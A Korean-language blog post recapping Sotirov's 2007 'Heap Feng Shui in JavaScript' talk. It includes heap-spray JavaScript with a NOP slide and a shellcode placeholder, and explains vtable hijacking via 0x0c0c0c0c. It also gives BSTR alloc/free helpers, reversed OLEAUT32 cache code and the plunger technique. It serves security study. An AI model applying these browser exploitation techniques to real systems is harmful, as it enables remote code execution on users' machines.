---
layout: post
title: "Heap Feng Shui in JavaScript"
date: 2014-05-02 15:15:17 +0900
comments: true
categories: 
---

Sotirov 의 오래된 발표를 recap 해본다. 적지 않은 내용들이 outdated 되었지만, 가치가 있다.

* [Heap Feng Shui in JavaScript](https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf)
* [Heap Feng Shui in JavaScript](https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Whitepaper/bh-eu-07-sotirov-WP.pdf)
* [Heap Feng Shui in JavaScript](http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html)

Sotirov 의 발표를 내멋대로 번역해본다.

### Blazde & SkyLined (2004)

200MB 의 heap 을 spray 하는 코드.

    var nop = unescape("%u9090%u9090");

    // Create a 1MB of NOP instruction followed by shellcode
    // malloc header    string length   NOP slide   shellcode   NULL terminator
    // 32 bytes         4 bytes         x bytes     y bytes     2 bytes

    while (nop.length <= 0x100000/2) nop += nop;

    nop = nop.substring(0, 0x100000 - 32/2 - 4/2 - shellcode.length - 2/2);

    var x = new Array();
    for (var i=0; i<200; i++)
        x[i] = nop + shellcode;

일단 1 MB (1024 * 1024 bytes) 이상의 string 을 만들고, `substring()` 통해서 system heap 에 alloc 한다.
unicode 라서 VirtualAlloc() chunk header 가 32 bytes. JavaScript 이 string 헤더가 4 bytes. NULL terminator 가 2 bytes.
substring() 의 단위가 unicode 라서 '나누기 2' 를 해준다.
`new Array()` 에 반복해서 assign 해줌으로서 system heap 에 200 MB 를 alloc 한다.
JavaScript object 는 JavaScript heap 에 alloc 되고 JavaScript string 은 default process heap 에 alloc 된다.

이제 windbg 를 통해서 이 spray 된 스트링들이 메모리 0x00000000 ~ 0x7fffffff 어디에 뿌려졌는지 찾아야 한다.
그리고, Browser 의 C++ object vtable 등을 오염시킬때 어떤 값으로 오염시켜야 저 영역으로 튀어나갈지 테스트해야 한다.

1. 만약 다음과 같이 virtual function 을 호출하는 코드가 있다고 하자. 
2. 그리고 우리는 브라우저의 C++ object 를 어떻게든 overwrite 할 수 있다고 하자.
3. 그리고 메모리의 특정 영역대를 JavaScript 을 통한 heap spray 로 write 할 수 있다고 하자.

Virtual function 을 호출하는 코드 샘플이다.

    mov ecx, dword ptr [eax]    ; get the vtable address
    push eax                    ; pass c++ this pointer as the first argument
    call dword ptr [ecx+08h]    ; call the function at offset 0x8 in the vtable

C++ object 의 첫 4 바이트는 vtable 을 가리키는 pointer 이다.
C++ object 의 처음 4 byte 를 0x0c0c0c0c 으로 overwrite 할 수 있다고 하자.
그리고 0x0c0c0c0c 영역을 heap spray 로 뿌려둘 수가 있다고 하자.
C++ object 의 ctable pointer 를 0x0c0c0c0c 로 overwrite 했고, 
0x0c0c0c0c 에 있는 fake vtable 도 offset +0 부터 0x0c0c0c0c 으로 overwrite 했다.

`eax` 가 0x0c0c0c0c 이었고, `mov ecx, dword ptr [eax]` 의 결과로 `ecx` 도 0x0c0c0c0c 이 되고,
`call dword ptr [ecx+08h]` 도 0x0c0c0c0c 을 호출하게 된다. 0x0c0c 는 `or al,0ch` 로 NOP-like instruction.
결국 EIP 는 0x0c0c0c0c 로 세팅되고, NOP-slide 를 따라 쭉 미끄러진다음에 shellcode 를 수행하게 된다.

### Heap Feng Shui (2007)

* The heap allocator is deterministic.
* Specific sequences of allocations and frees can be used to control the layout.
* We want to set the heap state before triggering a vulnerability.
* Heap spraying proves that JavaScript can access the system heap.
* We need a way to allocate and free blocks of an arbitrary size.
* JavaScript `string` objects use default process heap.

#### String Allocation

`OLEAUT32.DLL` 의 `SysAllocString()` 이 담당.

``` javascript
var str1 = "AAAAAAAAAAAAAAAAAAAA"; // doesn't allocate a new string
var str2 = str1.substr(0, 10); // allocates a new 10 character string
var str3 = str1 + str2; // allocates a new 30 character string
```

BSTR 에서는 `len = (bytes-6)/2` 이기때문에, 다음과 같은 코드가 성립.

``` javascript
// Build a long string with padding data

data = 'AAAA'

while (padding.length < MAX_ALLOCATION_LENGTH)
    padding = padding + padding;

// Allocate a memory block of a specified size in bytes

function alloc(bytes) {
    return padding.substr(0, (bytes-6)/2);
}
```

#### Garbage Collection

`OLEAUT32.DLL` 의 `SysFreeString` 이 담당.

``` javascript
var str; // We need to do the allocation and free in a function scope, otherwise the garbage collector will not free the string.

function alloc_str(bytes) {
    str = padding.substr(0, (bytes-6)/2);
}

function free_str() {
    str = null;
    CollectGarbage();
}

alloc_str(0x10000); // allocate memory block
free_str(); // free memory block
```

#### OLEAUT32 memory allocator

문제는, SysAllocStr() 이 caching 을 해서, 항상 시스템 힙에서 새로운 memory allocation 이 일어나는 것은 아니란 것. 

Cache 는 다음과 같이 구성된다. 4 개의 bin 이 있고, 각각 6 개의 블락을 홀딩할 수 있다. bin 은 사이즈로 나뉜다.

`APP_DATA::AllocCachedMem()` 와 `APP_DATA::FreeCachedMem()` 의 reverse 된 소스는 다음과 같다.

```
// Each entry in the cache has a size and a pointer to the free block

struct CacheEntry {
    unsigned int size;
    void * ptr;
}

// The cache consists of 4 bins, each holding 6 blocks of a certain size range

class APP_DATA {
    CacheEntry bin_1_32[6]; // blocks from 1 to 32 bytes
    CacheEntry bin_33_64[6];
    CacheEntry bin_65_256[6];
    CacheEntry bin_257_32768[6];

    void * AllocCachedMem(unsigned long size); // alloc function
    void FreeCachedMem(void * ptr); // free function
}

//
// Allocate memory, reusing the blocks from the cache
//
void * APP_DATA::AllocCachedMem(unsigned long size)
{
    CacheEntry * bin;
    int i;

    if (g_fDebNoCache == TRUE)
        goto system_alloc; // Use HeapAlloc if caching is disabled
    
    // Find the right cache bin for the block size

    if (size > 256)
        bin = &this->bin_257_32768;
    else if (size > 64)
        bin = &this->bin_65_256;
    else if (size > 32)
        bin = &this->bin_33_64;
    else
        bin = &this->bin_1_32;

    // Iterate through all entries in the bin

    for (i = 0; i < 6; i++) {

        // If the cached block is big enough, use it for this allocation

        if (bin[i].size >= size) {
            bin[i].size = 0; // size 0 means the cache entry is unused
            return bin[i].ptr;
        }
    }

system_alloc:

    // Allocate memory using the system memory allocator
    return HeapAlloc(GetProcessHeap(), 0, size);
}
```

APP_DATA memory allocator 가 사용하는 caching algorithm 이 방해가 되는 상황. Plunger 테크닉으로 극복.

#### Plunger technique

``` javascript
plunger = new Array();

// This function flushes out all blocks in the cache and leaves it empty

function flushCache() {
    
    // Free all blocks in the plunger array to push all smaller blocks out

    plunger = null;
    CollectGarbage();

    // Allocate 6 maximum size blocks from each bin and leave the cache empty

    plunger = new Array();

    for (i = 0; i < 6; i++) {
        plunger.push(alloc(32));
        plunger.push(alloc(64));
        plunger.push(alloc(256));
        plunger.push(alloc(32768));
    }
}

flushCache(); // Flush the cache before doing any allocations
alloc_str(0x200); // Allocate the string
free_str(); // Free the string and flush the cache
flushCache();
```


### Bibliography

* [Windows Vista Heap Management Enhancements by Adrian Marinescu](http://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Marinescu.pdf)
* [Third Generation Exploitation by Halvar Flake](http://www.blackhat.com/presentations/win-usa-02/halvarflake-winsec02.ppt)
* [Windows Heap Overflows by David Litchfield](http://www.blackhat.com/presentations/win-usa-04/bh-win-04-litchfield/bh-win-04-litchfield.ppt)
* [XP SP2 Heap Exploitation by Matt Conover](http://www.cybertech.net/~sh0ksh0k/projects/winheap/XPSP2 Heap Exploitation.ppt)
* [Bypassing Windows heap protections by Nicolas Falliere](http://packetstormsecurity.nl/papers/bypass/bypassing-win-heap-protections.pdf)
* [Defeating Microsoft Windows XP SP2 Heap Protection and DEP bypass by Alexander Anisimov](http://www.maxpatrol.com/defeating-xpsp2-heap-protection.pdf)
* [Exploiting Freelist[0] on XP SP2 by Brett Moore](http://www.security-assessment.com/Whitepapers/Exploiting_Freelist[0]_On_XPSP2.zip)
* [How Do The Script Garbage Collectors Work? by Eric Lippert](http://blogs.msdn.com/ericlippert/archive/2003/09/17/53038.aspx)
* [Internet Explorer IFRAME exploit by SkyLined](http://www.edup.tudelft.nl/~bjwever/advisory_iframe.html.php)
* [ie_webview_setslice exploit by H D Moore](http://metasploit.com/projects/Framework/exploits.html#ie_webview_setslice)
